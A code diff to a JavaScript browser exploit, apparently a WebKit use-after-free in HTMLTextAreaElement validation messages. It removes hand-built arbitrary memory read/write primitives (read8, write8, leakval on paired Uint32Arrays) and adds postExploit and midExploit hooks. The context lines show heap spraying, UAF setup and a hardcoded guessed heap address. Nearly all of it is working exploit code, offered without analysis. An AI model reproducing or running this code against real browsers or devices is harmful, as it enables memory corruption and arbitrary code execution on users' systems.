@@ -34,6 +34,8 @@ var g_jsview_butterfly = null;
 var g_message_heading_leak = null;
 var g_message_body_leak = null;
 
+var g_textarea_div_elem = null;
+
 var g_obj_str = {};
 
 var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "1px";
@@ -43,12 +45,6 @@ var g_round = 1;
 var g_input = null;
 
 var guess_htmltextarea_addr = new Int64("0x2031b00d8");
-
-var master_b = new Uint32Array(2);
-var slave_b =  new Uint32Array(2);
-var slave_addr;
-var slave_buf_addr;
-var master_addr;
 
 
 /* Executed after deleteBubbleTree */
@@ -124,66 +120,8 @@ function setupRW() {
 
 	/* Getting code execution */
 	/* ... */
-	var leak_slave = addrof(slave_b);
-	var slave_addr = read64(leak_slave.add(0x10));
-
-	og_slave_addr = new int64(slave_addr.low32(), slave_addr.hi32());
-	var leak_master = addrof(master_b);
-	write64(leak_master.add(0x10), leak_slave.add(0x10));
-	var prim = {
-		write8: function(addr, val) {
-			master_b[0] = addr.low;
-			master_b[1] = addr.hi;
-
-			if(val instanceof int64) {
-				slave_b[0] = val.low;
-				slave_b[1] = val.hi;
-			}
-			else {
-				slave_b[0] = val;
-				slave_b[1] = 0;
-			}
-
-			master_b[0] = og_slave_addr.low;
-			master_b[1] = og_slave_addr.hi;
-		},
-		write4: function(addr, val) {
-			master_b[0] = addr.low;
-			master_b[1] = addr.hi;
-
-			slave_b[0] = val;
-
-			master_b[0] = og_slave_addr.low;
-			master_b[1] = og_slave_addr.hi;
-		},
-		read8: function(addr) {
-			master_b[0] = addr.low;
-			master_b[1] = addr.hi;
-			var r = new int64(slave_b[0], slave_b[1]);
-			master_b[0] = og_slave_addr.low;
-			master_b[1] = og_slave_addr.hi;
-			return r;
-		},
-		read4: function(addr) {
-			master_b[0] = addr.low;
-			master_b[1] = addr.hi;
-			var r = slave_b[0];
-			master_b[0] = og_slave_addr.low;
-			master_b[1] = og_slave_addr.hi;
-			return r;
-		},
-		leakval: function(val) {
-			g_ab_slave.leakme = val;
-			master_b[0] = g_jsview_butterfly.low32() - 0x10;
-			master_b[1] = g_jsview_butterfly.hi32();
-			var r = new int64(slave_b[0], slave_b[1]);
-			master_b[0] = og_slave_addr.low;
-			master_b[1] = og_slave_addr.hi;
-			return r;
-		},
-	};
-	window.prim = prim;
-	setTimeout(stage2, 1000);
+	if(window.postExploit)
+		window.postExploit();
 }
 
 function read(addr, length) {
@@ -477,7 +415,7 @@ function prepareUAF() {
 function sprayHTMLTextArea() {
 	debug_log("[+] Spraying HTMLTextareaElement ...");
 
-	let textarea_div_elem = document.createElement("div");
+	let textarea_div_elem = g_textarea_div_elem = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
 	textarea_div_elem.id = "div1";
 	var element = document.createElement("textarea");
@@ -506,6 +444,9 @@ function sprayStringImpl(start, end) {
 function go() {
 	/* Init spray */
 	sprayHTMLTextArea();
+
+	if(window.midExploit)
+		window.midExploit();
 
 	g_input = input1;
 	/* Shape heap layout for obj. reuse */
